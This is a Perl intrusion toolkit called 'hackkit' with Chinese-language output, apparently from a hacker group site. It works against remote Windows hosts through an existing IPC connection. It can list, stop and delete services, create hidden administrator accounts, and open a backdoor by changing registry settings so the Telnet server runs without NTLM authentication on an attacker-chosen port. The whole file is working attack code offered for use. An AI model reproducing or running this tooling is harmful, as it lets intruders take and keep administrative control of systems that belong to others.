#!/usr/bin/perl
use Win32;
use IO::Socket;
use Socket;
use Win32::Service;
use Win32::Daemon;
use Win32::NetAdmin;
use Win32::Registry;

$count=0;
$count1=0;
$count2=0;
$ip=shift||127.0.0.1;chomp($ip);
$parm=shift||die "-----------------http://www.itaq.org------------------\nUseage: hackkit [host] -info 
                       -start  SRVNAME
                       -stop   SRVNAME 
                       -remove SRVNAME
                       -adduser <user> <passwd>
                       -deluser <user> 
                       -opendoor <port>
                       -closedoor 

Software created by SystEm32, CopyRight 2003-2005 INC.\n";
if($parm=~/^-(start||stop||remove||opendoor)$/) {$srv=$ARGV[0];}
else{$username=$ARGV[0];
     $pass=$ARGV[1];}
#print "@ARGV: $srv,$username,$pass\n";
$packed_ip=inet_aton($ip);
$host=gethostbyaddr($packed_ip,AF_INET)||$ip;

if($parm=~/^-info$/)  { Service_Info(); }
elsif($parm=~/^-start$/ && $srv) { Service_Start();}
elsif($parm=~/^-stop$/ && $srv)  { Service_Stop(); }
elsif($parm=~/^-remove$/ && $srv)   { Service_Remove();  }
elsif($parm=~/^-adduser$/ && $username && $pass) { User_Add($username,$pass); }
elsif($parm=~/^-deluser$/ && $username) { User_Del($username); }
elsif($parm=~/^-opendoor$/ && $srv) { Open_Door($srv);}
elsif($parm=~/^-closedoor$/) {Close_Door();}
else {die "-----------------http://www.itaq.org------------------\nUseage: hackkit [host] -info
                       -start  SRVNAME
                       -stop   SRVNAME 
                       -remove SRVNAME 
                       -adduser <user> <passwd>
                       -deluser <user> 
                       -opendoor <port>
                       -closedoor 

Software created by SystEm32, CopyRight 2003-2005 INC.\n";}

sub Service_Info {print "\n";
                  Win32::Service::GetServices($host,\%service) or print                   Win32::FormatMessage(Win32::GetLastError());
                  $hash=\%service;@keys=keys(%$hash);@key=sort(@keys);
                  foreach $key (@key) {Win32::Service::GetStatus($host,$$hash{$key},\%status);
                                       $stat=\%status;if($$stat{CurrentState} ==4) {$ss="已启动";$count1++;} 
                                    else {$ss="停止";$count2++;}
                     print "服务($ss): $$hash{$key} 描述 -> $key \n\n";$count++}
print "\n[$host] 共计$count项服务,已启动$count1项,未启动$count2项.\n";}

sub Service_Start { if(Win32::Service::StartService($host,$srv))
{print "[$srv] on \\\\$host started successful!";}
else {print Win32::FormatMessage(Win32::GetLastError());}}

sub Service_Stop { if(Win32::Service::StopService($host,$srv))
{print "[$srv] on \\\\$host stopped successful!";}
else {print Win32::FormatMessage(Win32::GetLastError());}}

sub Service_Remove {if(Win32::Daemon::DeleteService($host,$srv))
                   {print "[$srv] on \\\\$host removed successfully!\n";}
                    else {print Win32::FormatMessage(Win32::GetLastError());}}

sub User_Add { ($U,$P)=@_;if(Win32::NetAdmin::UserCreate($host,$U,'$P',0,USER_PRIV_USER,'','',UF_NORMAL_ACCOUNT,'') && Win32::NetAdmin::LocalGroupAddUsers($host,"Administrators",$U)){print "Add a user <$U> on [$host] successfully! \n";} else {print Win32::FormatMessage(Win32::NetAdmin::GetError());} }

sub User_Del { $U=shift;
if(Win32::NetAdmin::UserDelete($host,$U)) {print "User:<$U> deleted successfully! \n";} else{print Win32::FormatMessage(Win32::NetAdmin::GetError());}}

sub Open_Door {my $tip1;
    $HKEY_LOCAL_MACHINE->Connect($host,$reg1);
    $reg1->Open("SOFTWARE\\Microsoft\\TelnetServer\\1.0",$tip1)
        or die "Can't open tips: $^E";
    my ($type, $value);
    print "Binding shell to port $srv...";
    sleep(1);print ".";sleep(1);print ".";sleep(1);print ".";   
    $tip1->SetValueEx("NTLM",0,4,0) or die "Failed!\n\ncheck the IPC connection\n";
    $tip1->SetValueEx("TelnetPort",0,4,$srv) or die "Failed!\n\ncheck the IPC connection\n";
    $tip1->Close();
    $reg1->Close();
    if(Win32::Service::StartService($host,"TlntSvr")) {
    print "Successed!\nNow you can telnet it!Have a fun : ) \n";}
    else {print "Failed!\n";print Win32::FormatMessage(Win32::GetLastError());}
    }

sub Close_Door { my $tips;
    $HKEY_LOCAL_MACHINE->Connect($host,$reg);
    $reg->Open("SOFTWARE\\Microsoft\\TelnetServer\\1.0",$tips)
        or die "Can't open tips: $^E";
    my ($type, $value);    
    $tips->SetValueEx("NTLM",0,4,2);
    $tips->SetValueEx("TelnetPort",0,4,23);
    $tips->Close();
    $reg->Close();
    if(Win32::Service::StopService($host,"TlntSvr")) {print "The door closed sucessfully!\n";}}